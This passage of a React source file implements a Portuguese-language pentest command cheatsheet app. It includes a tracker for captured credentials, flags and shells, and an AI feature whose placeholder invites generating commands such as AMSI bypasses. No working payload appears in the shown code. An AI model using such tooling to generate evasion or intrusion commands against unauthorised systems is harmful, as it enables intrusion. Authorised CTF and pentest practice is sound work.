    trash:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M3 6h18M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>,
    target:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>,
    terminal:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>,
    clock:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>,
    export:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>,
    sidebar:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="3" x2="9" y2="21"/></svg>,
    note:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>,
    key:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg>,
    flag:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>,
    shell:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>,
    up:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="m18 15-6-6-6 6"/></svg>,
    chevR:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="m9 18 6-6-6-6"/></svg>,
    chevL:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="m15 18-6-6 6-6"/></svg>,
  };
  return icons[n] || null;
};

// ── MAIN APP ──────────────────────────────────────────────────────────────────
export default function App() {
  // Commands
  const [commands, setCommands] = useState(() => {
    try { const s=localStorage.getItem("cs_custom"); return s?[...INITIAL_COMMANDS,...JSON.parse(s)]:INITIAL_COMMANDS; }
    catch { return INITIAL_COMMANDS; }
  });
  // State
  const [favs, setFavs] = useState(() => { try{return new Set(JSON.parse(localStorage.getItem("cs_favs")||"[]"));}catch{return new Set();} });
  const [vars, setVars] = useState(() => { try{return JSON.parse(localStorage.getItem("cs_vars")||"{}");}catch{return {};} });
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("All");
  const [tagFilter, setTagFilter] = useState([]);
  const [copied, setCopied] = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  // Panels
  const [panel, setPanel] = useState(null); // 'vars'|'favs'|'add'|'ai'|'intel'|'notes'|'hist'|'keys'
  const [aiCmd, setAiCmd] = useState(null);
  const [aiMode, setAiMode] = useState("explain");
  const [aiResult, setAiResult] = useState("");
  const [aiLoading, setAiLoading] = useState(false);
  const [aiPrompt, setAiPrompt] = useState("");
  // New command form
  const [newCmd, setNewCmd] = useState({title:"",category:"Custom",tags:[],command:"",desc:""});
  // Timer
  const [timerRunning, setTimerRunning] = useState(false);
  const [timerSeconds, setTimerSeconds] = useState(0);
  // Copy history
  const [copyHist, setCopyHist] = useState(() => { try{return JSON.parse(localStorage.getItem("cs_hist")||"[]");}catch{return [];} });
  // Target Intel
  const [intel, setIntel] = useState(() => { try{return JSON.parse(localStorage.getItem("cs_intel")||"null")||{name:"",scope:"",objective:"",creds:[],flags:[],pivots:[]};}catch{return {name:"",scope:"",objective:"",creds:[],flags:[],pivots:[]};} });
  // Notes
  const [notes, setNotes] = useState(() => { try{return JSON.parse(localStorage.getItem("cs_notes")||"[]");}catch{return [];} });
  const [noteText, setNoteText] = useState("");

  const searchRef = useRef(null);
  const mainRef = useRef(null);

  // Persist
  useEffect(()=>{localStorage.setItem("cs_favs",JSON.stringify([...favs]));},[favs]);
  useEffect(()=>{localStorage.setItem("cs_vars",JSON.stringify(vars));},[vars]);
  useEffect(()=>{localStorage.setItem("cs_hist",JSON.stringify(copyHist));},[copyHist]);
  useEffect(()=>{localStorage.setItem("cs_intel",JSON.stringify(intel));},[intel]);
  useEffect(()=>{localStorage.setItem("cs_notes",JSON.stringify(notes));},[notes]);

  // Timer
  useEffect(()=>{
    if(!timerRunning) return;
    const id=setInterval(()=>setTimerSeconds(s=>s+1),1000);
    return ()=>clearInterval(id);
  },[timerRunning]);

  // Keyboard shortcuts
  useEffect(()=>{
    const h=(e)=>{
      if((e.ctrlKey||e.metaKey)&&e.key==="k"){e.preventDefault();searchRef.current?.focus();}
      if(e.key==="Escape"){setPanel(null);setAiResult("");}
      if((e.ctrlKey||e.metaKey)&&e.shiftKey&&e.key==="A"){e.preventDefault();setPanel("add");}
      if((e.ctrlKey||e.metaKey)&&e.shiftKey&&e.key==="F"){e.preventDefault();setPanel("favs");}
      if((e.ctrlKey||e.metaKey)&&e.key==="b"){e.preventDefault();setSidebarOpen(o=>!o);}
      if((e.ctrlKey||e.metaKey)&&e.key==="i"){e.preventDefault();setPanel("intel");}
      if((e.ctrlKey||e.metaKey)&&e.key==="/"){ e.preventDefault();setPanel("keys");}
      if((e.ctrlKey||e.metaKey)&&e.key==="ArrowRight"){
        e.preventDefault();
        const idx=CATEGORIES.indexOf(category);
        setCategory(CATEGORIES[(idx+1)%CATEGORIES.length]);
      }
      if((e.ctrlKey||e.metaKey)&&e.key==="ArrowLeft"){
        e.preventDefault();
        const idx=CATEGORIES.indexOf(category);
        setCategory(CATEGORIES[(idx-1+CATEGORIES.length)%CATEGORIES.length]);
      }
    };
    window.addEventListener("keydown",h);
    return ()=>window.removeEventListener("keydown",h);
  },[category]);

  // Filter
  const filtered = commands.filter(c=>{
    const q=search.toLowerCase();
    const ms=!q||c.title.toLowerCase().includes(q)||c.command.toLowerCase().includes(q)||c.desc?.toLowerCase().includes(q);
    const mc=category==="All"||c.category===category;
    const mt=tagFilter.length===0||tagFilter.some(t=>c.tags.includes(t));
    return ms&&mc&&mt;
  });

  const groupedByCategory = CATEGORIES.slice(1).reduce((acc,cat)=>{
    const items=filtered.filter(c=>c.category===cat);
    if(items.length) acc[cat]=items;
    return acc;
  },{});

  function copyCmd(cmd,id,title){
    const resolved=applyVars(cmd,vars);
    navigator.clipboard.writeText(resolved).then(()=>{
      setCopied(id);
      setTimeout(()=>setCopied(null),1500);
      const entry={id,title,command:resolved,at:new Date().toLocaleTimeString()};
      setCopyHist(h=>[entry,...h].slice(0,20));
    });
  }

  function toggleFav(id){setFavs(p=>{const n=new Set(p);n.has(id)?n.delete(id):n.add(id);return n;});}
  function toggleTag(t){setTagFilter(p=>p.includes(t)?p.filter(x=>x!==t):[...p,t]);}

  function addCustom(){
    if(!newCmd.title||!newCmd.command) return;
    const cmd={...newCmd,id:Date.now()};
    const updated=[...commands,cmd];
    setCommands(updated);
    localStorage.setItem("cs_custom",JSON.stringify(updated.filter(c=>c.id>1000)));
    setNewCmd({title:"",category:"Custom",tags:[],command:"",desc:""});
    setPanel(null);
  }

  function deleteCustom(id){
    const updated=commands.filter(c=>c.id!==id);
    setCommands(updated);
    localStorage.setItem("cs_custom",JSON.stringify(updated.filter(c=>c.id>1000)));
    setFavs(p=>{const n=new Set(p);n.delete(id);return n;});
  }

  async function callAI(mode,cmd){
    setAiMode(mode); setAiCmd(cmd); setPanel("ai"); setAiLoading(true); setAiResult("");
    const prompts={
      explain:`Explique em português de forma clara e técnica o que este comando faz, seus parâmetros e quando usá-lo:\n\`\`\`\n${cmd?.command||""}\n\`\`\``,
      suggest:`Sugira 3 variações úteis deste comando para diferentes cenários. Responda em português com cada variação em bloco de código separado e uma linha explicando:\n\`\`\`\n${cmd?.command||""}\n\`\`\``,
      generate:`Gere um comando de terminal para a seguinte tarefa: "${aiPrompt}". Responda em português com o comando em bloco de código e uma explicação breve.`,
    };
    try{
      const res=await fetch("https://api.anthropic.com/v1/messages",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({model:"claude-sonnet-4-20250514",max_tokens:1000,messages:[{role:"user",content:prompts[mode]}]}),
      });
      const data=await res.json();
      setAiResult(data.content?.[0]?.text||"Sem resposta.");
    }catch{setAiResult("Erro ao contactar a API.");}
    setAiLoading(false);
  }

  function exportIntel(){
    const lines=[
      `=== TARGET INTEL REPORT ===`,
      `Machine: ${intel.name}`,
      `Scope: ${intel.scope}`,
      `Objective: ${intel.objective}`,
      ``,`=== CREDENTIALS ===`,
      ...intel.creds.map(c=>`• ${c}`),
      ``,`=== FLAGS ===`,
      ...intel.flags.map(f=>`• ${f}`),
      ``,`=== PIVOTS / SHELLS ===`,
      ...intel.pivots.map(p=>`• ${p}`),
    ].join("\n");
    const a=document.createElement("a");
    a.href=URL.createObjectURL(new Blob([lines],{type:"text/plain"}));
    a.download=`intel_${intel.name||"target"}.txt`;
    a.click();
  }

  function scrollTop(){mainRef.current?.scrollTo({top:0,behavior:"smooth"});}

  const favList=commands.filter(c=>favs.has(c.id));

  return (
    <div style={{fontFamily:"'JetBrains Mono','Fira Code',monospace",background:"#0a0c0f",minHeight:"100vh",color:"#c9d1d9",display:"flex",flexDirection:"column"}}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@600;800&display=swap');
        *{box-sizing:border-box;margin:0;padding:0;}
        ::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:#0d1117;}::-webkit-scrollbar-thumb{background:#30363d;border-radius:2px;}
        .cmd-card{transition:all .15s ease;border:1px solid #21262d;}
        .cmd-card:hover{border-color:#00ff88;background:#0d1117!important;box-shadow:0 0 20px rgba(0,255,136,.05);}
        .tag-pill{font-size:10px;padding:1px 7px;border-radius:3px;border:1px solid;font-weight:600;letter-spacing:.05em;}
        .btn{cursor:pointer;transition:all .15s;border:none;background:none;color:inherit;}
        .btn:hover{opacity:.8;}
        .ai-result code{background:#161b22;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:12px;}
        .ai-result pre{background:#161b22;padding:12px;border-radius:6px;border:1px solid #30363d;overflow-x:auto;margin:8px 0;font-size:12px;line-height:1.6;color:#79c0ff;}
        .ai-result p{line-height:1.7;margin-bottom:8px;font-size:13px;}
        .ai-result h3{color:#00ff88;margin:12px 0 6px;font-size:13px;}
        input,select,textarea{background:#161b22;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;outline:none;font-family:inherit;font-size:13px;}
        input:focus,select:focus,textarea:focus{border-color:#00ff88;box-shadow:0 0 0 2px rgba(0,255,136,.1);}
        .cat-btn{transition:all .15s;white-space:nowrap;cursor:pointer;}
        .cat-btn.active{color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,.08);}
        .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:40;backdrop-filter:blur(4px);}
        .panel{position:fixed;top:0;right:0;bottom:0;width:440px;background:#0d1117;border-left:1px solid #21262d;z-index:50;overflow-y:auto;}
        .spinner{width:18px;height:18px;border:2px solid #30363d;border-top-color:#00ff88;border-radius:50%;animation:spin .6s linear infinite;display:inline-block;}
        @keyframes spin{to{transform:rotate(360deg);}}
        .scan-line{position:fixed;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,#00ff88,transparent);animation:scan 5s linear infinite;opacity:.2;z-index:100;pointer-events:none;}
        @keyframes scan{0%{transform:translateY(0);}100%{transform:translateY(100vh);}}
        .cmd-text{font-size:12px;line-height:1.6;color:#79c0ff;word-break:break-all;}
        .resolved{color:#00ff88!important;}
        .sidebar{transition:all .25s ease;overflow:hidden;}
        .scroll-top{position:fixed;bottom:24px;right:24px;z-index:35;width:36px;height:36px;border-radius:50%;background:#0d1117;border:1px solid #30363d;color:#8b949e;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s;}
        .scroll-top:hover{border-color:#00ff88;color:#00ff88;}
        .intel-input{width:100%;padding:6px 10px;margin-bottom:6px;}
        .list-item{display:flex;align-items:center;gap:8px;padding:6px 10px;background:#161b22;border-radius:5px;margin-bottom:4px;font-size:12px;}
        @media(max-width:768px){.panel{width:100%;}.sidebar{display:none;}}
      `}</style>

      <div className="scan-line"/>

      {/* HEADER */}
      <header style={{borderBottom:"1px solid #21262d",padding:"12px 16px",background:"#0d1117",position:"sticky",top:0,zIndex:30,flexShrink:0}}>
        <div style={{display:"flex",alignItems:"center",gap:12,flexWrap:"wrap"}}>

          {/* Logo + Sidebar toggle */}
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <button className="btn" onClick={()=>setSidebarOpen(o=>!o)} style={{color:"#58a6ff",padding:4}} title="Ctrl+B">
              <I n="sidebar" s={16}/>
            </button>
            <I n="terminal" s={18}/>
            <span style={{fontFamily:"'Orbitron',monospace",fontSize:15,fontWeight:800,color:"#00ff88",letterSpacing:".1em"}}>CHEATSHEET</span>
            <span style={{fontFamily:"'Orbitron',monospace",fontSize:9,color:"#58a6ff"}}>v2.0</span>
          </div>

          {/* Timer */}
          <div style={{display:"flex",alignItems:"center",gap:6,padding:"4px 10px",border:"1px solid #21262d",borderRadius:6,cursor:"pointer"}}
            onClick={()=>setTimerRunning(r=>!r)} onDoubleClick={()=>{setTimerRunning(false);setTimerSeconds(0);}}>
            <I n="clock" s={12}/>
            <span style={{fontFamily:"'Orbitron',monospace",fontSize:12,color:timerRunning?"#00ff88":"#8b949e"}}>{formatTime(timerSeconds)}</span>
          </div>

          {/* Search */}
          <div style={{flex:1,minWidth:180,position:"relative"}}>
            <span style={{position:"absolute",left:10,top:"50%",transform:"translateY(-50%)",color:"#58a6ff"}}><I n="search" s={13}/></span>
            <input ref={searchRef} value={search} onChange={e=>setSearch(e.target.value)}
              placeholder="Buscar... (Ctrl+K)" style={{width:"100%",padding:"7px 12px 7px 32px"}}/>
          </div>

          {/* Action buttons */}
          <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>
            {[
              {label:"Intel",icon:"target",p:"intel",color:"#f85149"},
              {label:"Notes",icon:"note",p:"notes",color:"#8b949e",badge:notes.length||null},
              {label:"Favs",icon:"starF",p:"favs",color:"#f7c948",badge:favs.size||null},
              {label:"Hist",icon:"clock",p:"hist",color:"#8b949e",badge:copyHist.length||null},
              {label:"Vars",icon:"vars",p:"vars",color:"#58a6ff"},
              {label:"⌨",icon:null,p:"keys",color:"#8b949e"},
            ].map(({label,icon,p,color,badge})=>(
              <button key={p} className="btn" onClick={()=>setPanel(panel===p?null:p)}
                style={{display:"flex",alignItems:"center",gap:5,padding:"5px 10px",border:`1px solid ${panel===p?color:"#30363d"}`,borderRadius:6,fontSize:11,color:panel===p?color:"#8b949e",background:panel===p?`${color}15`:"transparent",position:"relative"}}>
                {icon&&<I n={icon} s={12}/>}{label}
                {badge?<span style={{background:"#21262d",borderRadius:8,padding:"0 5px",fontSize:10,color}}>{badge}</span>:null}
              </button>
            ))}
            <button className="btn" onClick={()=>setPanel("add")}
              style={{display:"flex",alignItems:"center",gap:5,padding:"5px 10px",border:"1px solid #00ff88",borderRadius:6,fontSize:11,color:"#00ff88",background:"rgba(0,255,136,.07)"}}>
              <I n="plus" s={12}/>Novo
            </button>
          </div>
        </div>

        {/* Category bar */}
        <div style={{display:"flex",gap:5,overflowX:"auto",paddingBottom:2,marginTop:10}}>
          {CATEGORIES.map(cat=>(
            <button key={cat} className={`cat-btn btn${category===cat?" active":""}`}
              onClick={()=>setCategory(cat)}
              style={{padding:"3px 10px",border:"1px solid #30363d",borderRadius:4,fontSize:10,color:"#8b949e",background:"transparent"}}>
              {cat}
            </button>
          ))}
        </div>

        {/* Tag filters */}
        <div style={{display:"flex",gap:5,marginTop:7}}>
          {["critical","high","medium","osep","new","custom"].map(t=>(
            <button key={t} onClick={()=>toggleTag(t)} className={`btn tag-pill ${TAG_STYLE[t]}`}
              style={{opacity:tagFilter.length===0||tagFilter.includes(t)?1:0.3}}>
              {TAG_LABEL[t]}
            </button>
          ))}
          {tagFilter.length>0&&<button className="btn" onClick={()=>setTagFilter([])} style={{fontSize:10,color:"#8b949e",padding:"0 6px"}}>✕ limpar</button>}
        </div>
      </header>

      {/* BODY */}
      <div style={{display:"flex",flex:1,overflow:"hidden"}}>

        {/* SIDEBAR */}
        <div className="sidebar" style={{width:sidebarOpen?200:0,flexShrink:0,borderRight:"1px solid #21262d",background:"#0d1117",overflowY:"auto",overflowX:"hidden"}}>
          <div style={{width:200,padding:"12px 8px"}}>
            <p style={{fontSize:9,color:"#30363d",letterSpacing:".1em",fontWeight:700,textTransform:"uppercase",padding:"0 8px",marginBottom:8}}>Categorias</p>
            {CATEGORIES.map(cat=>{
              const count=cat==="All"?commands.length:commands.filter(c=>c.category===cat).length;
              return(
                <button key={cat} className="btn" onClick={()=>setCategory(cat)}
                  style={{width:"100%",textAlign:"left",padding:"5px 8px",borderRadius:4,fontSize:11,
                    color:category===cat?"#00ff88":"#8b949e",
                    background:category===cat?"rgba(0,255,136,.08)":"transparent",
                    display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                  <span style={{overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{cat}</span>
                  <span style={{fontSize:10,color:"#30363d",flexShrink:0}}>{count}</span>
                </button>
              );
            })}

            <div style={{margin:"16px 8px 8px",borderTop:"1px solid #21262d",paddingTop:12}}>
              <p style={{fontSize:9,color:"#30363d",letterSpacing:".1em",fontWeight:700,textTransform:"uppercase",marginBottom:8}}>Stats</p>
              {[
                {label:"Total",val:commands.length,color:"#58a6ff"},
                {label:"Filtrados",val:filtered.length,color:"#00ff88"},
                {label:"Favoritos",val:favs.size,color:"#f7c948"},
                {label:"Custom",val:commands.filter(c=>c.id>1000).length,color:"#bc8cff"},
              ].map(s=>(
                <div key={s.label} style={{display:"flex",justifyContent:"space-between",fontSize:11,marginBottom:4}}>
                  <span style={{color:"#8b949e"}}>{s.label}</span>
                  <span style={{color:s.color,fontWeight:700}}>{s.val}</span>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* MAIN */}
        <main ref={mainRef} style={{flex:1,overflowY:"auto",padding:"20px 20px"}}>

          {/* AI Generate */}
          <div style={{background:"#0d1117",border:"1px solid #21262d",borderRadius:10,padding:"14px 18px",marginBottom:24,borderLeftWidth:3,borderLeftColor:"#bc8cff"}}>
            <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:10}}>
              <I n="ai" s={15}/>
              <span style={{fontSize:12,color:"#bc8cff",fontWeight:600}}>Gerar Comando com IA</span>
            </div>
            <div style={{display:"flex",gap:8}}>
              <input value={aiPrompt} onChange={e=>setAiPrompt(e.target.value)}
                onKeyDown={e=>{if(e.key==="Enter"&&aiPrompt) callAI("generate",{});}}
                placeholder="Ex: enumerar usuários AD sem credenciais, bypass de AMSI..."
                style={{flex:1,padding:"7px 12px"}}/>
              <button className="btn" onClick={()=>aiPrompt&&callAI("generate",{})}
                disabled={!aiPrompt||aiLoading}
                style={{padding:"7px 14px",background:aiPrompt?"rgba(188,140,255,.15)":"transparent",border:"1px solid #bc8cff",borderRadius:6,color:"#bc8cff",fontSize:12,opacity:aiPrompt?1:.4}}>
                {aiLoading&&aiMode==="generate"?<div className="spinner"/>:"Gerar ↵"}
              </button>
            </div>
          </div>

          {/* Commands */}
          {category==="All"
            ? Object.entries(groupedByCategory).map(([cat,items])=>(
              <section key={cat} style={{marginBottom:28}}>
                <h2 style={{fontSize:10,fontWeight:700,color:"#58a6ff",letterSpacing:".15em",textTransform:"uppercase",marginBottom:10,display:"flex",alignItems:"center",gap:8}}>
                  <span style={{width:16,height:1,background:"#30363d",display:"inline-block"}}/>
                  {cat} <span style={{color:"#30363d"}}>({items.length})</span>
                </h2>
                <div style={{display:"grid",gap:6}}>
                  {items.map(cmd=><CmdCard key={cmd.id} cmd={cmd} vars={vars} favs={favs} copied={copied} onCopy={copyCmd} onFav={toggleFav} onAI={(m)=>callAI(m,cmd)} onDelete={cmd.id>1000?deleteCustom:null}/>)}
                </div>
              </section>
            ))
            : (
              <div style={{display:"grid",gap:6}}>
                {filtered.length===0&&<p style={{color:"#8b949e",fontSize:13,textAlign:"center",padding:40}}>Nenhum comando encontrado.</p>}
                {filtered.map(cmd=><CmdCard key={cmd.id} cmd={cmd} vars={vars} favs={favs} copied={copied} onCopy={copyCmd} onFav={toggleFav} onAI={(m)=>callAI(m,cmd)} onDelete={cmd.id>1000?deleteCustom:null}/>)}
              </div>
            )
          }
        </main>
      </div>

      {/* SCROLL TOP */}
      <button className="scroll-top" onClick={scrollTop} title="Voltar ao topo"><I n="up" s={16}/></button>

      {/* ── PANELS ── */}
      {panel&&panel!=="ai"&&<div className="overlay" onClick={()=>setPanel(null)}/>}

      {/* VARS */}
      {panel==="vars"&&(
        <div className="panel">
          <PanelHeader title="VARIÁVEIS GLOBAIS" color="#58a6ff" onClose={()=>setPanel(null)}/>
          <div style={{padding:"0 20px 20px"}}>
            <p style={{fontSize:11,color:"#8b949e",marginBottom:14}}>Aplicadas automaticamente em todos os comandos.</p>
            {VAR_KEYS.map(k=>(
              <div key={k} style={{marginBottom:10}}>
                <label style={{fontSize:11,color:"#58a6ff",display:"block",marginBottom:3}}>{`{${k}}`}</label>
                <input value={vars[k]||""} onChange={e=>setVars(p=>({...p,[k]:e.target.value}))}
                  placeholder={VAR_PLACEHOLDERS[k]} style={{width:"100%",padding:"6px 10px"}}/>
              </div>
            ))}
            <button className="btn" onClick={()=>setVars({})} style={{marginTop:8,width:"100%",padding:"7px",border:"1px solid #30363d",borderRadius:6,fontSize:12,color:"#8b949e"}}>Limpar Tudo</button>
          </div>
        </div>
      )}

      {/* FAVS */}
      {panel==="favs"&&(
        <div className="panel">
          <PanelHeader title={`FAVORITOS (${favs.size})`} color="#f7c948" onClose={()=>setPanel(null)}
            extra={<button className="btn" onClick={()=>{const d=JSON.stringify(favList,null,2);const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([d]));a.download="favorites.json";a.click();}} style={{fontSize:11,color:"#8b949e",display:"flex",gap:4,alignItems:"center"}}><I n="export" s={12}/>Export</button>}/>
          <div style={{padding:"0 20px 20px"}}>
            {favList.length===0?<p style={{color:"#8b949e",fontSize:13}}>Nenhum favorito ainda.</p>
              :<div style={{display:"grid",gap:6}}>{favList.map(cmd=><CmdCard key={cmd.id} cmd={cmd} vars={vars} favs={favs} copied={copied} onCopy={copyCmd} onFav={toggleFav} onAI={m=>callAI(m,cmd)} compact/>)}</div>
            }
          </div>
        </div>
      )}

      {/* ADD */}
      {panel==="add"&&(
        <div className="panel">
          <PanelHeader title="NOVO COMANDO" color="#00ff88" onClose={()=>setPanel(null)}/>
          <div style={{padding:"0 20px 20px"}}>
            {[{l:"Título",k:"title",t:"input",ph:"Ex: Nmap Quick Scan"},{l:"Descrição",k:"desc",t:"input",ph:"O que esse comando faz?"},{l:"Comando",k:"command",t:"textarea",ph:"nmap -sV {RHOST}"}].map(f=>(
              <div key={f.k} style={{marginBottom:10}}>
                <label style={{fontSize:11,color:"#8b949e",display:"block",marginBottom:3}}>{f.l}</label>
                {f.t==="textarea"
                  ?<textarea value={newCmd[f.k]} onChange={e=>setNewCmd(p=>({...p,[f.k]:e.target.value}))} placeholder={f.ph} rows={3} style={{width:"100%",padding:"6px 10px",resize:"vertical"}}/>
                  :<input value={newCmd[f.k]} onChange={e=>setNewCmd(p=>({...p,[f.k]:e.target.value}))} placeholder={f.ph} style={{width:"100%",padding:"6px 10px"}}/>
                }
              </div>
            ))}
            <div style={{marginBottom:10}}>
              <label style={{fontSize:11,color:"#8b949e",display:"block",marginBottom:3}}>Categoria</label>
              <select value={newCmd.category} onChange={e=>setNewCmd(p=>({...p,category:e.target.value}))} style={{width:"100%",padding:"6px 10px"}}>
                {CATEGORIES.slice(1).map(c=><option key={c}>{c}</option>)}
              </select>
            </div>
            <div style={{marginBottom:14}}>
              <label style={{fontSize:11,color:"#8b949e",display:"block",marginBottom:6}}>Tags</label>
              <div style={{display:"flex",gap:5,flexWrap:"wrap"}}>
                {TAGS.map(t=>(
                  <button key={t} className={`btn tag-pill ${TAG_STYLE[t]}`}
                    onClick={()=>setNewCmd(p=>({...p,tags:p.tags.includes(t)?p.tags.filter(x=>x!==t):[...p.tags,t]}))}
                    style={{opacity:newCmd.tags.includes(t)?1:.3}}>
                    {TAG_LABEL[t]}
                  </button>
                ))}
              </div>
            </div>
            <button className="btn" onClick={addCustom} disabled={!newCmd.title||!newCmd.command}
              style={{width:"100%",padding:"9px",background:newCmd.title&&newCmd.command?"rgba(0,255,136,.15)":"transparent",border:"1px solid #00ff88",borderRadius:6,color:"#00ff88",fontSize:13,fontWeight:600,opacity:newCmd.title&&newCmd.command?1:.4}}>
              + Salvar Comando
            </button>
          </div>
        </div>
      )}

      {/* COPY HISTORY */}
      {panel==="hist"&&(
        <div className="panel">
          <PanelHeader title={`HISTÓRICO (${copyHist.length})`} color="#8b949e" onClose={()=>setPanel(null)}
            extra={<button className="btn" onClick={()=>setCopyHist([])} style={{fontSize:11,color:"#f85149"}}>Limpar</button>}/>
          <div style={{padding:"0 20px 20px"}}>
            {copyHist.length===0?<p style={{color:"#8b949e",fontSize:13}}>Nenhum comando copiado ainda.</p>:
              copyHist.map((h,i)=>(
                <div key={i} style={{marginBottom:8,padding:"8px 10px",background:"#161b22",borderRadius:6,border:"1px solid #21262d"}}>
                  <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
                    <span style={{fontSize:11,color:"#e6edf3",fontWeight:600}}>{h.title}</span>
                    <span style={{fontSize:10,color:"#8b949e"}}>{h.at}</span>
                  </div>
                  <code style={{fontSize:11,color:"#79c0ff",wordBreak:"break-all"}}>{h.command}</code>
                </div>
              ))
            }
          </div>
        </div>
      )}

      {/* TARGET INTEL */}
      {panel==="intel"&&(
        <div className="panel" style={{width:480}}>
          <PanelHeader title="TARGET INTEL" color="#f85149" onClose={()=>setPanel(null)}
            extra={<button className="btn" onClick={exportIntel} style={{fontSize:11,color:"#8b949e",display:"flex",gap:4,alignItems:"center"}}><I n="export" s={12}/>Export .txt</button>}/>
          <div style={{padding:"0 20px 20px"}}>
            {/* Basic info */}
            <div style={{marginBottom:16}}>
              <label style={{fontSize:10,color:"#f85149",display:"block",marginBottom:4,letterSpacing:".1em",textTransform:"uppercase",fontWeight:700}}>Engajamento / Máquina</label>
              <input className="intel-input" value={intel.name} onChange={e=>setIntel(p=>({...p,name:e.target.value}))} placeholder="Ex: HTB — Forest" style={{width:"100%",padding:"7px 10px"}}/>
              <label style={{fontSize:10,color:"#f85149",display:"block",margin:"8px 0 4px",letterSpacing:".1em",textTransform:"uppercase",fontWeight:700}}>Escopo / IPs</label>
              <input className="intel-input" value={intel.scope} onChange={e=>setIntel(p=>({...p,scope:e.target.value}))} placeholder="Ex: 10.10.10.161" style={{width:"100%",padding:"7px 10px"}}/>
              <label style={{fontSize:10,color:"#f85149",display:"block",margin:"8px 0 4px",letterSpacing:".1em",textTransform:"uppercase",fontWeight:700}}>Objetivo / Foco Atual</label>
              <textarea value={intel.objective} onChange={e=>setIntel(p=>({...p,objective:e.target.value}))} placeholder="Ex: Obter acesso inicial via AS-REP Roasting" rows={2} style={{width:"100%",padding:"7px 10px",resize:"vertical"}}/>
            </div>

            {/* Credentials */}
            <IntelList icon="key" label="Credenciais Capturadas" color="#00ff88" items={intel.creds}
              onAdd={v=>setIntel(p=>({...p,creds:[...p.creds,v]}))}
              onDelete={i=>setIntel(p=>({...p,creds:p.creds.filter((_,j)=>j!==i)}))}
              placeholder="user:password ou user:hash"/>

            {/* Flags */}
            <IntelList icon="flag" label="Flags Capturadas" color="#f7c948" items={intel.flags}
              onAdd={v=>setIntel(p=>({...p,flags:[...p.flags,v]}))}
              onDelete={i=>setIntel(p=>({...p,flags:p.flags.filter((_,j)=>j!==i)}))}
              placeholder="user.txt ou root.txt hash"/>

            {/* Pivots */}
            <IntelList icon="shell" label="Pivots / Shells Ativos" color="#bc8cff" items={intel.pivots}
              onAdd={v=>setIntel(p=>({...p,pivots:[...p.pivots,v]}))}
              onDelete={i=>setIntel(p=>({...p,pivots:p.pivots.filter((_,j)=>j!==i)}))}
              placeholder="shell em 10.10.10.5:4444 como www-data"/>
          </div>
        </div>
      )}

      {/* NOTES */}
      {panel==="notes"&&(
        <div className="panel">
          <PanelHeader title={`NOTAS (${notes.length})`} color="#8b949e" onClose={()=>setPanel(null)}/>
          <div style={{padding:"0 20px 20px"}}>
            <div style={{display:"flex",gap:8,marginBottom:14}}>
              <textarea value={noteText} onChange={e=>setNoteText(e.target.value)} placeholder="Nova nota..." rows={3} style={{flex:1,padding:"7px 10px",resize:"vertical"}}/>
              <button className="btn" onClick={()=>{if(noteText.trim()){setNotes(n=>[{text:noteText.trim(),at:new Date().toLocaleTimeString()},...n]);setNoteText("");}}}
